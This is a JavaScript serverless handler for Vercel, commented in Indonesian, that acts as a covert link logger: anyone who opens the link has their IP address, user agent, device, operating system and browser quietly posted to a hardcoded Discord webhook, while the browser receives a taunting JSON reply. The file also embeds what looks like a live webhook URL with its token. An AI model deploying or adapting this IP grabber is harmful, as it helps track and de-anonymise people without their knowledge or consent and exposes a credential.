// File: api/index.js
// Deploy ke Vercel - versi JSON only

export default async function handler(req, res) {
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5';
  
  // Ambil IP dari Vercel
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() 
    || req.socket.remoteAddress 
    || 'unknown';

  // === KIRIM JSON KE BROWSER ===
  res.setHeader('Content-Type', 'application/json');
  res.status(200).json({
    message: "SIRI NO TAHI WWKWKW",
    status: "ok",
    timestamp: new Date().toISOString(),
    server_ip: ip,
    note: "Data perangkat sudah dikirim ke webhook"
  });

  // === KIRIM DATA KE DISCORD (tanpa menunggu response) ===
  try {
    // Ambil user agent dari request
    const userAgent = req.headers['user-agent'] || 'unknown';
    
    // Parse user agent sederhana
    const deviceInfo = parseUserAgent(userAgent);
    
    // Data lengkap untuk Discord
    const discordData = {
      content: `**🔔 ADA YANG BUKA LINK!**\n\n` +
        `**🌐 IP Server:** \`${ip}\`\n` +
        `**📱 Device:** ${deviceInfo.device || 'Unknown'}\n` +
        `**💻 OS:** ${deviceInfo.os || 'Unknown'}\n` +
        `**🌍 Browser:** ${deviceInfo.browser || 'Unknown'}\n` +
        `**🕒 Waktu:** ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n` +
        `**📱 USER AGENT:**\n\`\`\`\n${userAgent}\n\`\`\``
    };

    // Kirim ke Discord (fire and forget)
    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordData)
    });
  } catch (err) {
    console.error('Discord error:', err);
  }
}

// Fungsi parse user agent sederhana
function parseUserAgent(ua) {
  const info = { device: 'Unknown', os: 'Unknown', browser: 'Unknown' };
  
  // Deteksi device
  if (/mobile|android|iphone|ipad/i.test(ua)) info.device = 'Mobile';
  else if (/tablet/i.test(ua)) info.device = 'Tablet';
  else info.device = 'Desktop';
  
  // Deteksi OS
  if (/windows/i.test(ua)) info.os = 'Windows';
  else if (/mac os/i.test(ua)) info.os = 'macOS';
  else if (/linux/i.test(ua)) info.os = 'Linux';
  else if (/android/i.test(ua)) info.os = 'Android';
  else if (/iphone|ipad|ipod/i.test(ua)) info.os = 'iOS';
  
  // Deteksi Browser
  if (/chrome/i.test(ua) && !/edg/i.test(ua)) info.browser = 'Chrome';
  else if (/firefox/i.test(ua)) info.browser = 'Firefox';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) info.browser = 'Safari';
  else if (/edg/i.test(ua)) info.browser = 'Edge';
  else if (/opera|opr/i.test(ua)) info.browser = 'Opera';
  
  return info;
}
